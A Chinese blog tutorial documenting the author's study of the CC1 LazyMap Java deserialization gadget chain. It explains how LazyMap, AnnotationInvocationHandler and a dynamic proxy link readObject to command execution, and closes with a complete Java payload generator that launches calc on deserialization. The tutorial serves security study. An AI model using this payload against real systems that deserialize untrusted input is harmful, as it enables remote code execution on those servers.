---
title: 代码审计 | CC1 LazyMap 链 —— 动态代理
cover: >-
  https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/TranscodedWallpaper.jpg
categories:
  - [代码审计, cc]
tags:
  - 代码审计
  - Java
  - 反序列化
  - Java反序列化
  - 动态代理
abbrlink: d4f8a2c1
date: 2026-04-02 13:00:00
---

# 代码审计 | CC1 LazyMap 链 —— 动态代理

> 学习笔记，记录自己学 CC1 LazyMap 版的思路历程
>
> 前置：已经看完 TransformedMap 版，Transformer 链那部分这里就不重复了，直接从"触发点不同"讲起。

---

## 目录

- [和 TransformedMap 版有什么区别](#和-transformedmap-版有什么区别)
- [第一步：LazyMap 的触发机制](#第一步lazymap-的触发机制)
- [第二步：谁来调用 LazyMap.get()](#第二步谁来调用-lazymapget)
  - [AnnotationInvocationHandler.invoke() 里有 get()](#annotationinvocationhandlerinvoke-里有-get)
  - [invoke() 怎么自动被调用——动态代理](#invoke-怎么自动被调用动态代理)
- [第三步：readObject 怎么触发 invoke()](#第三步readobject-怎么触发-invoke)
- [第四步：两层 Handler 的构造](#第四步两层-handler-的构造)
- [完整 Payload](#完整-payload)
- [完整调用链总结](#完整调用链总结)
- [和 TransformedMap 版对比](#和-transformedmap-版对比)

---

## 和 TransformedMap 版有什么区别

TransformedMap 版的触发路径是这样的：

```
readObject()
  └─ setValue()
       └─ checkSetValue()
            └─ ChainedTransformer.transform()  ← 命令执行
```

LazyMap 版的触发路径是这样的：

```
readObject()
  └─ proxyMap.entrySet()      ← 调用代理对象上的任意方法
       └─ invoke()            ← 动态代理拦截，转到 AnnotationInvocationHandler.invoke()
            └─ LazyMap.get()  ← 这里触发 transform()
                 └─ ChainedTransformer.transform()  ← 命令执行
```

核心差异：
- TransformedMap 触发的是 `setValue()`
- LazyMap 触发的是 `get()`，具体是 `LazyMap.get(不存在的key)` 时自动调用 `factory.transform()`

Transformer 链本身（`ConstantTransformer` + 三个 `InvokerTransformer`）完全一样，不用改。

---

## 第一步：LazyMap 的触发机制

先看 `LazyMap.get()` 的源码，在 `org.apache.commons.collections.map.LazyMap` 里：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/1775103218274.png)

关键逻辑：

```java
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

只要 `get()` 时传入一个 map 里不存在的 key，就会自动调用 `factory.transform(key)`。如果 `factory` 是我们的 `ChainedTransformer`，命令就执行了。

还有个问题，`LazyMap` 类虽然是 `public` 的，但构造方法是 `protected`：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260402125241952.png)

查找用法找到 `decorate()`，它是 `public` 的并且内部会调用 `LazyMap(map, factory)`：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260402125357953.png)

所以构造方式为：

```java
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, chain);
```

`innerMap` 是空的，目的是让后续 `get(任意key)` 时永远命中 `containsKey == false` 的分支，稳定触发 `transform()`。

先简单测试一下：

```java
public static void main(String[] args) throws Exception {
    // 1. 构造 Transformer 链（和 TransformedMap 版完全一样）
    Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                    new Class[]{String.class, Class[].class},
                    new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                    new Class[]{Object.class, Object[].class},
                    new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                    new Class[]{String.class},
                    new Object[]{"calc"})
    };
    ChainedTransformer chain = new ChainedTransformer(transformers);

    // 2. 构造 LazyMap
    Map innerMap = new HashMap();
    Map lazyMap = LazyMap.decorate(innerMap, chain);
    lazyMap.get("test");
}
```

没有问题。`"test"` 可以是任何值，因为 `ChainedTransformer` 第一步是 `ConstantTransformer(Runtime.class)`，会直接忽略传入的 key，固定输出 `Runtime.class`，后面的链跟 key 是什么完全没关系。

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260402130447751.png)

现在的问题就是：**谁来调用 `lazyMap.get()`？**

---

## 第二步：谁来调用 LazyMap.get()

搜索结果有 1000 条不止，过滤完也还是很多：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260402131902585.png)

如果是真的挖链，就是一步一步试错加上对 Java 的熟悉程度。这里直接跳到结论——最终找到的是 `AnnotationInvocationHandler.invoke()`。

### AnnotationInvocationHandler.invoke() 里有 get()

看 `AnnotationInvocationHandler.invoke()` 源码：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260402133226546.png)

关键部分：

```java
public Object invoke(Object proxy, Method method, Object[] args) {
    String member = method.getName();
    // ...处理 equals/toString/hashCode 等特殊方法...

    // 普通注解方法的处理
    Object result = memberValues.get(member); // ← 这里！
    // ...
}
```

`invoke()` 里会用方法名去 `memberValues.get(methodName)` 查值。如果 `memberValues` 是我们的 `LazyMap`，且这个 key 不存在，就会触发 `factory.transform()`，链子就起来了。

### invoke() 怎么自动被调用——动态代理

`invoke()` 是 `InvocationHandler` 接口的方法，`AnnotationInvocationHandler` 实现了这个接口所以重写了它。配合 Java 动态代理使用：**当代理对象上的任何方法被调用时，`invoke()` 自动介入。**

```java
// 用 handler1 作为 InvocationHandler，代理 Map 接口
Map proxyMap = (Map) Proxy.newProxyInstance(
    Map.class.getClassLoader(),
    new Class[]{Map.class},
    handler1  // ← 拦截之后转发给谁，在这里指定的
);
```

这样，只要谁对 `proxyMap` 调用了任何方法（比如 `entrySet()`、`size()`……），都会被 `handler1.invoke()` 拦截，进而触发 `lazyMap.get(方法名)`。

---

## 第三步：readObject 怎么触发 invoke()

现在还差最后一步——反序列化时怎么自动跑到 `proxyMap.entrySet()`？

回到 `AnnotationInvocationHandler.readObject()` 源码：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260402172916043.png)

```java
private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException {
    s.defaultReadObject();
    // ...
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) { // ← 注意这里
        // ...
    }
}
```

`readObject()` 里有一句 `memberValues.entrySet()`。如果这个 `memberValues` 就是我们的 `proxyMap`（动态代理对象），那么调用 `proxyMap.entrySet()` 就会：

1. 触发代理拦截 → `handler1.invoke()` 被调用，`member = "entrySet"`
2. `handler1.memberValues.get("entrySet")` → `lazyMap.get("entrySet")`
3. `"entrySet"` 不在 `innerMap` 里 → `factory.transform("entrySet")` 被调用
4. `ChainedTransformer` 第一步是 `ConstantTransformer`，直接输出 `Runtime.class`，忽略输入 `"entrySet"`
5. 后续 `InvokerTransformer` 链一路跑到 `exec("calc")`

链就这样通了。

---

## 第四步：两层 Handler 的构造

梳理一下整个嵌套结构：

```
handler2（外层 AnnotationInvocationHandler）← 序列化这个
  └─ memberValues = proxyMap（动态代理）
       └─ InvocationHandler = handler1（内层 AnnotationInvocationHandler）
            └─ memberValues = lazyMap
                 └─ factory = ChainedTransformer（Transformer 链）
```

handler1 和 handler2 的关系

```
handler2
  └─ memberValues = proxyMap
                      └─ InvocationHandler = handler1
                                               └─ memberValues = lazyMap
```

handler1 通过 proxyMap 被包在 handler2 里面，不是完全独立的。

为什么拦截转发给 handler1.invoke()

因为创建 `proxyMap` 的时候，指定的 `InvocationHandler` 就是 `handler1`：

```java
Map proxyMap = (Map) Proxy.newProxyInstance(
    Map.class.getClassLoader(),
    new Class[]{Map.class},
    handler1  // ← 拦截之后转发给谁，在这里指定的
);
```

动态代理的规则就是：代理对象上任何方法被调用，都转发给创建时指定的那个 `InvocationHandler` 的 `invoke()` 方法。这里指定的是 `handler1`，所以就转发给 `handler1.invoke()`。

反序列化时的完整流程：

```
反序列化 handler2
  → 触发 handler2.readObject()
  → readObject() 里调用 memberValues.entrySet()
  → memberValues 是 proxyMap（代理对象），触发拦截
  → 拦截转发给 handler1.invoke()（创建 proxyMap 时指定的）
  → invoke() 里调用 lazyMap.get("entrySet")
  → lazyMap 里没有这个 key
  → 触发 factory.transform()
  → 命令执行
```

两层 Handler 用的是同一个构造器，只是 `memberValues` 参数不同。`AnnotationInvocationHandler` 构造方法是限制访问的，需要反射调用：

```java
// 反射拿到构造器
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);

// 内层：memberValues = lazyMap
InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);

// 动态代理
Map proxyMap = (Map) Proxy.newProxyInstance(
    Map.class.getClassLoader(),
    new Class[]{Map.class},
    handler1
);

// 外层：memberValues = proxyMap
Object handler2 = constructor.newInstance(Target.class, proxyMap);
```

---

## 完整 Payload

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CC1LazyMap {
    public static void main(String[] args) throws Exception {

        // 1. 构造 Transformer 链（和 TransformedMap 版完全一样）
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod",
                new Class[]{String.class, Class[].class},
                new Object[]{"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke",
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class},
                new Object[]{"calc"})
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);

        // 2. 构造 LazyMap
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chain);

        // 3. 构造内层 AnnotationInvocationHandler（handler1）
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler1 = (InvocationHandler) constructor.newInstance(
            java.lang.annotation.Target.class, lazyMap
        );

        // 4. 创建代理对象（代理 Map 接口，InvocationHandler 是 handler1）
        Map proxyMap = (Map) Proxy.newProxyInstance(
            Map.class.getClassLoader(),
            new Class[]{Map.class},
            handler1
        );

        // 5. 构造外层 AnnotationInvocationHandler（handler2），memberValues 是 proxyMap
        Object handler2 = constructor.newInstance(
            java.lang.annotation.Target.class, proxyMap
        );

        // 6. 序列化 handler2
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(handler2);
        byte[] payload = baos.toByteArray();

        // 7. 反序列化（触发链）
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(payload));
        ois.readObject();
    }
}
```

运行效果：

![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/20260402174607539.png)

---

## 完整调用链总结

```
反序列化
  └─ AnnotationInvocationHandler（handler2）.readObject()    ← 自动触发
       └─ proxyMap.entrySet()                                ← memberValues 是代理对象
            └─ AnnotationInvocationHandler（handler1）.invoke()  ← 代理拦截
                 └─ lazyMap.get("entrySet")                  ← memberValues 是 LazyMap
                      └─ ChainedTransformer.transform()      ← "entrySet" key 不存在，触发
                           ├─ ConstantTransformer            → Runtime.class（忽略输入）
                           ├─ InvokerTransformer             → getMethod("getRuntime")
                           ├─ InvokerTransformer             → invoke() → Runtime 实例
                           └─ InvokerTransformer             → exec("calc")  🎯
```

---

## 和 TransformedMap 版对比

| | TransformedMap 版 | LazyMap 版 |
|---|---|---|
| 触发点 | `setValue()` | `LazyMap.get()` |
| 中间层 | `TransformedMap` | `LazyMap` + 动态代理 |
| readObject 里的触发动作 | `for` 循环里的 `memberValue.setValue()` | `memberValues.entrySet()` |
| Handler 层数 | 一层 | 两层（外层 handler2 + 内层 handler1）|
| 动态代理 | 不需要 | 需要 |
| Transformer 链 | 完全相同 | 完全相同 |

LazyMap 版稍微绕一点，多了一个动态代理的转发层，但思路是一样的——都是想办法让 `readObject()` 里能自动走到 `transform()`。
